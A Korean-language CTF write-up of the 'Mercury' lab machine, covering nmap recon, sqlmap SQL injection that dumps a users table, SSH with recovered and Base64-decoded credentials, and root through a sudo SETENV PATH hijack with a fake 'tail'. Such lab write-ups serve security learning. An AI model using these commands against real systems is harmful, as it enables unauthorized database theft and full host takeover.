# Mercury CTF Machine Writeup 🪐

## 1. 호스트 탐색 (Host Discovery)


<img width="418" height="490" alt="스크린샷 2026-05-22 142759" src="https://github.com/user-attachments/assets/34d1b229-6163-48a4-b5e5-c4c43996c921" />


```bash
nmap -sn 172.16.11.0/24
```

**왜 쓰나?**
`-sn` 옵션은 포트 스캔 없이 네트워크 대역 전체에 ping을 보내 살아있는 호스트만 빠르게 찾는다. 전체 포트를 다 뒤지면 시간이 오래 걸리므로 먼저 타겟 IP를 특정하는 것이 핵심.

> **결과:** `172.16.11.204` 발견


---

## 2. 포트 및 서비스 스캔 (Port & Service Enumeration)

```bash
nmap -sC -sV -Pn -p- 172.16.11.204
```

**옵션 해설:**
| 옵션 | 의미 |
|------|------|
| `-sC` | 기본 NSE 스크립트 실행 (버전, 취약점 기초 탐지) |
| `-sV` | 각 포트에서 실행 중인 서비스 버전 탐지 |
| `-Pn` | ping 응답이 없어도 스캔 강제 진행 (방화벽 우회) |
| `-p-` | 1~65535 전체 포트 스캔 |

> **결과:** `8080` 포트에서 HTTP 서비스 확인


<img width="871" height="424" alt="스크린샷 2026-05-22 134435" src="https://github.com/user-attachments/assets/65def252-9fb2-4e4c-8ff7-b749621b7f13" />

<img width="889" height="404" alt="스크린샷 2026-05-22 134543" src="https://github.com/user-attachments/assets/c7a9dd0f-d641-41b7-a3f6-6c6f437d21d6" />

---

## 3. 웹 정찰 (Web Enumeration)

### robots.txt 확인

```
http://172.16.11.204:8080/robots.txt
```

**왜 확인하나?**
`robots.txt`는 검색 엔진 크롤러에게 "여기는 오지 마" 라고 알려주는 파일인데, 역설적으로 **숨기고 싶은 경로가 적혀있어** 공격자에게 힌트가 된다.

> **결과:** `User-agent: *` → 와일드카드(`*`) 경로 힌트 발견

<img width="890" height="742" alt="스크린샷 2026-05-22 134712" src="https://github.com/user-attachments/assets/00f46305-eddf-4892-8c52-60e7a336f066" />


### 숨겨진 경로 접근

```
http://172.16.11.204:8080/*
→ http://172.16.11.204:8080/mercuryfacts/
```

> `mercuryfacts/숫자` 형태의 URL 구조 발견 → URL 파라미터가 DB에 직접 전달될 가능성이 높음 → **SQL Injection 의심**


<img width="896" height="777" alt="스크린샷 2026-05-22 134815" src="https://github.com/user-attachments/assets/dbc82735-87f6-4900-a255-f37a94b02b29" />

<img width="896" height="776" alt="스크린샷 2026-05-22 134902" src="https://github.com/user-attachments/assets/17c0d9b6-5055-4f38-ae8a-f03a55b1661a" />

<img width="898" height="759" alt="스크린샷 2026-05-22 134952" src="https://github.com/user-attachments/assets/b353907d-eee6-405e-8c81-430339f79143" />

<img width="896" height="767" alt="스크린샷 2026-05-22 134959" src="https://github.com/user-attachments/assets/fa3e011d-dcfc-43b2-b5bc-c79ec0709993" />

---

## 4. SQL 인젝션 공격 (SQLMap)

### 4-1. 데이터베이스 목록 추출

```bash
sqlmap -u "http://172.16.11.204:8080/mercuryfacts/" --dbs --batch
```

**옵션 해설:**
| 옵션 | 의미 |
|------|------|
| `-u` | 타겟 URL 지정 |
| `--dbs` | 존재하는 데이터베이스 목록 전체 덤프 |
| `--batch` | 모든 질문에 자동으로 기본값 선택 (대화형 입력 생략) |

**탐지된 인젝션 유형:**
```
[INFO] URI parameter '#1*' is 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' injectable
```

이 메시지는 sqlmap이 **에러 기반 인젝션(Error-based SQLi)** 취약점을 확실히 확인했다는 의미다. 서버가 SQL 오류 메시지를 그대로 반환해서, 그 오류 안에 DB 정보가 담겨 나온다.

> **결과:** `information_schema`, `mercury` 데이터베이스 확인

<img width="889" height="767" alt="스크린샷 2026-05-22 135256" src="https://github.com/user-attachments/assets/a3b5f0e6-69b2-498a-863a-31b7266813ad" />

<img width="956" height="1014" alt="스크린샷 2026-05-22 135913" src="https://github.com/user-attachments/assets/4168ab27-7b4a-4687-af07-83c9a8771aac" />

<img width="903" height="884" alt="스크린샷 2026-05-22 140424" src="https://github.com/user-attachments/assets/74e8ff8b-66b6-4efa-909d-fba7380f1b02" />

<img width="862" height="803" alt="스크린샷 2026-05-22 140602" src="https://github.com/user-attachments/assets/e69a2bab-2308-42c7-99ec-7604c58e2cfd" />


---

### 4-2. 테이블 목록 추출

```bash
sqlmap -u "http://172.16.11.204:8080/mercuryfacts/" -D mercury --tables --batch
```

**`-D mercury`** → mercury 데이터베이스만 타겟으로 좁혀서 테이블 목록 조회

> **결과:** `facts`, `users` 테이블 발견

---

### 4-3. users 테이블 전체 덤프

```bash
sqlmap -u "http://172.16.11.204:8080/mercuryfacts/" -D mercury -T users --dump --batch
```

**`-T users --dump`** → users 테이블의 모든 레코드를 그대로 추출

> **결과:** 계정 정보 획득

<img width="869" height="382" alt="스크린샷 2026-05-22 140801" src="https://github.com/user-attachments/assets/dd3658c5-cec8-4dbd-b3a4-a7565bffa716" />


---

## 5. SSH 접속 및 user flag 획득

```bash
ssh webmaster@172.16.11.204
# password: mercuryisthesizeof0.056Earths
```

**왜 SSH인가?**
DB에서 털어온 계정 정보가 시스템 계정과 동일하게 재사용되는 경우가 많다. **크리덴셜 재사용(Credential Reuse)** 은 CTF뿐 아니라 실제 침해 사고에서도 매우 흔한 공격 벡터다.

```bash
cat user_flag.txt
```

<img width="479" height="88" alt="스크린샷 2026-05-22 140910" src="https://github.com/user-attachments/assets/542c731e-8e20-4164-ad9d-b13c8b49df3a" />


> **user flag 획득 ✅**

---

## 6. 권한 상승 (Privilege Escalation)

### 6-1. 내부 메모 발견

```bash
cat mercury_proj/notes.txt
```

```
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

평문이 아닌 Base64로 인코딩된 비밀번호가 메모 파일 안에 저장되어 있었다. Base64는 암호화가 아니라 **단순 인코딩**이므로 즉시 복호화 가능하다.

---

### 6-2. Base64 디코딩

```bash
echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
# 결과: mercurymeandiameteris4880km
```

> **linuxmaster** 계정 비밀번호 확보

---

### 6-3. sudo 권한 확인

```bash
ssh linuxmaster@172.16.11.204
sudo -l
```

```
User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

**핵심 포인트:**
- `(root : root)` → 이 스크립트를 root 권한으로 실행 가능
- **`SETENV`** → sudo 실행 시 **환경 변수를 임의로 설정**할 수 있음 ← 이게 취약점

---

### 6-4. PATH Hijacking으로 root 쉘 탈취

**1단계 — 가짜 `tail` 명령어 심기**

```bash
echo '/bin/bash' > /tmp/tail
chmod +x /tmp/tail
```

`check_syslog.sh` 스크립트는 내부적으로 `tail` 명령어를 사용한다고 추측할 수 있다 (syslog를 확인하는 스크립트이므로). `/tmp`에 같은 이름의 파짜 실행 파일을 만들고, 그 내용을 `/bin/bash`(쉘 실행)로 채운다.

**2단계 — PATH 환경 변수 조작 후 sudo 실행**

```bash
sudo PATH=/tmp:$PATH /usr/bin/check_syslog.sh
```

**왜 이게 되나?**

리눅스는 명령어를 실행할 때 `PATH` 환경 변수에 나열된 디렉토리를 **왼쪽부터 순서대로** 탐색한다. `/tmp`를 맨 앞에 끼워넣으면, 스크립트가 `tail`을 호출할 때 `/usr/bin/tail` 대신 `/tmp/tail`(우리가 만든 가짜 파일)을 먼저 찾아 실행하게 된다.

`SETENV` 권한이 없었다면 sudo는 `PATH`를 안전한 기본값으로 강제 초기화하므로 이 공격이 불가능하다. **`SETENV`가 있기 때문에 PATH 변수를 그대로 넘길 수 있어** 공격이 성립한다.

```
# root shell 획득
root@mercury:~# cat /root/root_flag.txt
```

> **root flag 획득 ✅**

<img width="883" height="1035" alt="스크린샷 2026-05-22 141649" src="https://github.com/user-attachments/assets/b51748db-49a0-4f8f-9244-a5b76eefec51" />


---

## 공격 흐름 요약

```
nmap 호스트 탐색
    └─> 포트 스캔 (8080 HTTP 발견)
            └─> 웹 정찰 (robots.txt → /mercuryfacts/)
                    └─> SQLMap SQL Injection
                            └─> DB 덤프 → 계정 정보 획득
                                    └─> SSH 접속 (webmaster) → user flag
                                            └─> 내부 메모 발견 → Base64 디코딩
                                                    └─> linuxmaster SSH 접속
                                                            └─> sudo SETENV + PATH Hijacking
                                                                    └─> root shell → root flag 🏁
```
